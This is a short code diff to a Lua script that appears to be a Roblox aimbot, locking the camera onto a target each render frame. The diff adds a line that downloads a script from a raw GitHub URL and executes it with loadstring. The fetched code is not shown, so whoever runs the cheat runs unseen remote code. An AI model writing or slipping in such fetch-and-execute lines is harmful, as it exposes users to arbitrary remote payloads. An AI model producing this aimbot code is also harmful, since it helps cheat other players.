@@ -58,3 +58,5 @@ RunService:BindToRenderStep("AimLock", 0, function()
         CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
     end
     end)
+  ----------------------------------------------  
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Acorny/newspades/main/vain/random-thing/grahhh/nyc"))()
